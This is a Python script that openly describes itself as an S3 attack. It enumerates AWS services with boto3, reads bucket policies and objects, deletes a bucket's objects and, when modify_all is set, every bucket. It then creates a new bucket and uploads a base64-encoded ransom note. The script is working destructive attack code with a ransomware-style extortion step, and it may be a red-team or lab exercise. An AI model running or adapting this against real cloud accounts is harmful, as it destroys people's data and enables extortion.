"""
Task definition
1. Enumerate few services - enumerate using the policy simulator
    a. iam list-users
    b. iam list-roles
    c. ec2 describe-instances
    d. lambda list-functions
1. S3 list buckets
2. S3 list
3. S3 get object
4 If successful, s3 get-object --recursive
5. S3 delete all objects
6. s3 put-object
"""

import base64
import boto3
import botocore
from logger import get_logger
from enumeration import enumerate_services

logger = get_logger("enumerations_n_s3_access")

def modify_s3_buckets(
    s3_client: boto3.client,
    bucket_name_to_upload: str,
    modify_all: bool = False,
    del_objects_only: bool = True,
) -> bool:
    """
    this method performs a basic s3 attack to get/remove objects
    and put a file stating a warning message"""

    if not s3_client:
        raise Exception("s3 client not provided to make s3 API calls")

    # Previously seen, s3 client was able to list down buckets
    # task1: list atleast 1 bucket
    try:
        bucket_list = s3_client.list_buckets(MaxBuckets=1)
        if bucket_list.get("Buckets", []).__len__() < 0:
            logger.info("No buckets present")
            return False

        #TODO: Modify this part in case of getting all buckets
        if bucket_list.get("Buckets").__len__() < 1:
            logger.error("No buckets found")
            return False
        bucket = bucket_list.get("Buckets")[0]
        logger.info(f"Found bucket name: {bucket.get("Name")}")
        logger.info(f"Found bucket arn: {bucket.get("BucketArn")}")

        # task2: get bucket configs (like check bucket policy)
        # needed for an attack to check what actions can attacker performs on the bucket
        try:
            bucket_policy = s3_client.get_bucket_policy(Bucket=bucket.get("Name"))
        except botocore.exceptions.ClientError as err:
            logger.error(f"No bucket policy attached to bucket {bucket.get("Name")}")
        else:
            if bucket_policy.get("Policy"):
                logger.info(f"Given Policy of a Bucket: {bucket.get("Name")}")
                logger.info(bucket_policy.get("Policy"))
            else:
                logger.info(f"No policy is defined for bucket {bucket.get("Name")}")

        # task3: get an object from the bucket (only 5 objects)
        bucket_objects = s3_client.list_objects_v2(Bucket=bucket.get("Name"), MaxKeys=5)
        if bucket_objects.get("KeyCount"):
            bucket_keys = bucket_objects.get("Contents")
            for each_bucket_key in bucket_keys:
                s3_object = s3_client.get_object(
                    Bucket=bucket.get("Name"), Key=each_bucket_key.get("Key")
                )
                if s3_object.get("Body") and isinstance(
                    s3_object.get("Body"), botocore.response.StreamingBody
                ):
                    data = s3_object.get("Body", b"").read()
                    if data:
                        logger.info(
                            f"{bucket.get("Name")}/{each_bucket_key.get("Key")} has data and not empty"
                        )
                    else:
                        logger.info(
                            f"{bucket.get("Name")}/{each_bucket_key.get("Key")} is empty"
                        )
        else:
            logger.info(f"No objects present in bucket: {bucket.get("Name")}")

        # task4: delete all buckets (based on modify_all parameter)
        # Requirement: prior to deleting a bucket, delete all objects of bucket first
        if modify_all or del_objects_only:
            # delete objects from the bucket only, keep bucket empty
            # if Quiet, success response won't be displayed but errors response
            if bucket_objects.get("KeyCount"):
                prepare_delete_document = {"Objects": [], "Quiet": True}
                for each_bucket_object in bucket_objects.get("Contents", ()):
                    prepare_delete_document["Objects"].append(
                        {"Key": each_bucket_object.get("Key")}
                    )
                resp = s3_client.delete_objects(
                    Bucket=bucket.get("Name"), Delete=prepare_delete_document
                )
                if resp.get("Errors", ()).__len__() > 0:
                    logger.error(
                        "Errors while deleting objects",
                        [i.get("Key") for i in resp.get("Errors")],
                    )
                else:
                    logger.info("All objects deleted successfully")

            if modify_all:
                for each_bucket in bucket_list.get("Buckets"):  # iterate over list
                    resp = s3_client.delete_bucket(Bucket=each_bucket.get("Name"))
                    if resp.get("ResponseMetadata").get("HTTPStatusCode") in range(200,300):
                        logger.info("Bucket deleted successfully")
                    else:
                        logger.error("Something went wrong, bucket not deleted") 

        # task5: upload a document with encoded key
        data = base64.b64encode("pay ransome and get all the objects".encode())
        s3_client.create_bucket(Bucket=bucket_name_to_upload, CreateBucketConfiguration={'LocationConstraint': "ap-south-1"})
        resp = s3_client.put_object(Bucket=bucket_name_to_upload, Key="got-facked.txt", Body=data)
        if resp.get("ResponseMetadata", {}).get("HTTPStatusCode", 0) == 200:
            logger.info("ransom text uploaded successfully")
        else:
            logger.error("something went wrong while uploading ransom text")
    except Exception as err:
        logger.error(err.__str__())


def attack_s3():
    """this function will call the other functions in sequence"""

    # check if other services are available
    available_clients = enumerate_services()
    if s3client := available_clients.get("s3", None):
        modify_s3_buckets(
            s3client, bucket_name_to_upload="open-bucket-me", modify_all=True, del_objects_only=True
        )
